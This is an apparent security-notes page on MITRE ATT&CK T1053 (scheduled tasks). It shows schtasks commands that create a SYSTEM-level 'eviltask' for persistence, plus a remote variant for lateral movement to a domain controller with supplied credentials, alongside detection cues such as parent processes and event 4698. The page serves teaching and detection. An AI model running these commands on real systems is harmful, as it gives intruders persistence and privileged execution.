---
description: 'Code execution, privilege escalation, lateral movement and persitence.'
---

# T1053: Schtask

## Execution

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```bash
schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
```
{% endcode-tabs-item %}
{% endcode-tabs %}

## Observations

Note that processes spawned as scheduled tasks have `taskeng.exe` process as the parent:

![](../.gitbook/assets/schtask-ancestry.png)

Monitoring and inspecting commandline arguments and established network connections by processes can help uncover suspicious activity:

![](../.gitbook/assets/schtasks-created.png)

![](../.gitbook/assets/schtask-connection.png)

Also, look for vents 4698 indicating new scheduled task creation:

![](../.gitbook/assets/schtasks-created-new-task.png)

### Lateral Movement

Note that when using schtasks for lateral movement, the processes spawned do not have taskeng.exe as their parent, rather - svchost:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```bash
schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/schtasks-remote.png)

{% embed data="{\"url\":\"https://attack.mitre.org/wiki/Technique/T1053\",\"type\":\"link\",\"title\":\"Scheduled Task - ATT&CK for Enterprise\",\"icon\":{\"type\":\"icon\",\"url\":\"https://attack.mitre.org/favicon.ico\",\"aspectRatio\":0}}" %}

{% embed data="{\"url\":\"https://docs.microsoft.com/en-us/windows/desktop/taskschd/schtasks\",\"type\":\"link\",\"title\":\"Schtasks.exe\",\"description\":\"Enables an administrator to create, delete, query, change, run, and end scheduled tasks on a local or remote computer.\",\"icon\":{\"type\":\"icon\",\"url\":\"https://docs.microsoft.com/favicon.ico\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://docs.microsoft.com/\_themes/docs.theme/master/en-us/\_themes/images/microsoft-header.png\",\"width\":128,\"height\":128,\"aspectRatio\":1}}" %}

